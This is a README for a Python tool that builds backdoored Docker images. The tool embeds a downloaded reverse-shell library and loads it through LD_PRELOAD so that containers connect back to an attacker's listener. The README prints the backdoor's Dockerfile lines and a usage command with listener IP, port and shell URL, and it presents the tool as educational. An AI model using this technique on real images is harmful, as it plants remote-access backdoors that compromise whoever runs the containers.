# Trojanizedocker - Docker Backdoor Image Creator (Based on Dockerscan)

This Python script facilitates the creation of a backdoored Docker image. It automates the process by downloading a specified reverse shell binary, embedding it into the Docker image, and configuring environment variables to establish a reverse shell connection. 
This is a Python script that is going to help a user to create a Docker image with a backdoor. By doing so, it makes the process automatic by making use of a certain reversed shell binary, embedding it into the Docker image and setting environment variables to provide reverse shell connection. The script uses reverse shell component that was originally developed by [cr0hn - Dockerscan](https://github.com/cr0hn/dockerscan/blob/590a844418038d25e6649e609ef630868e0c9161/dockerscan/actions/image/modifiers/shells/reverse_shell.so).

## Background

The motivation for developing this script stemmed from the lack of recent updates on the Dockerscan project; the last commit was made on May 27, 2020 [view commit](https://github.com/cr0hn/dockerscan//commit/590a844418038d25e6649e609ef630868e0c9161). The need for a substitute that would be easy to use and work with the different versions of Python which was used by Dockerscan.

## Purpose

It is achieved by designing the software for educational purposes, enabling users to understand and demonstrate the operations of Docker image manipulation using `LD_PRELOAD`.

## How It Works

The script performs several key operations to create a backdoored Docker image:

1. **Download Reverse Shell Binary**: It downloads a reverse shell shared object file (`.so`) from a specified URL. This file is designed to establish a remote connection from the Docker container to an attacker-controlled server.

2. **Create Dockerfile**: The script dynamically generates a Dockerfile that incorporates the downloaded reverse shell. This Dockerfile instructs Docker to copy the reverse shell into the image and set it to be loaded before any other library by using the `LD_PRELOAD` environment variable.

## Understanding LD_PRELOAD and Reverse Shell Injection

- The Dockerfile created by this script contains the following critical lines:

```
COPY reverse_shell.so /usr/share/lib/reverse_shell.so
ENV LD_PRELOAD=/usr/share/lib/reverse_shell.so
```
## What Does This Do?

- `COPY reverse_shell.so /usr/share/lib/reverse_shell.so`: Command copies the reverse shell binary (reverse_shell.so - used in dockerscan) into a specific location inside the Docker image. 

- `ENV LD_PRELOAD`=/usr/share/lib/reverse_shell.so: By setting the LD_PRELOAD environment variable, it is intructed that the Linux dynamic linker to load our specified `reverse_shell.so` file before any other libraries when a program is run. This is a powerful method for modifying the behavior of compiled applications transparently.

- Use LD_PRELOAD leading to immediate code execution: Using `LD_PRELOAD` with a constructor attribute in the shared object allows executing custom code before the main application starts. This can be used for debugging, monitoring, or altering the application's normal operation without modifying the source code.

  
## Requirements

Before running the script, ensure that Docker is installed and running on your system. Python 3.x is also required.

## Installation

Install the required Python libraries with:

```
pip install -r requirements.txt
```

## Usage

```
python docker_backdoor.py -i <base-image> -o <output-image> -l <listener-ip> -p <listener-port> --shell-url <url-to-reverse-shell>
```

[![Watch the video](https://i9.ytimg.com/vi_webp/YIwkOf3P2ws/mqdefault.webp?v=662d6aaf&sqp=CKjTtbEG&rs=AOn4CLDNoW7ZHFtktp9-dI3EaiUb4swHMg)](https://youtu.be/YIwkOf3P2ws)

## Credits [Based On]

- **Backdooring Docker images - Reverse shell**: [Backdooring Docker images - Reverse shell](https://greencashew.dev/posts/backdooring-docker-images-reverse-shell/)
- **DockerScan GitHub Repository**: [Source for DockerScan, a tool for security analysis of Docker containers](https://github.com/cr0hn/dockerscan/)
- **LD_PRELOAD: How to Run Code at Load Time**: [LD_PRELOAD: How to Run Code at Load Time](https://www.secureideas.com/blog/2021/ldpreload-runcode.html)
- Thanks to #chatgpt
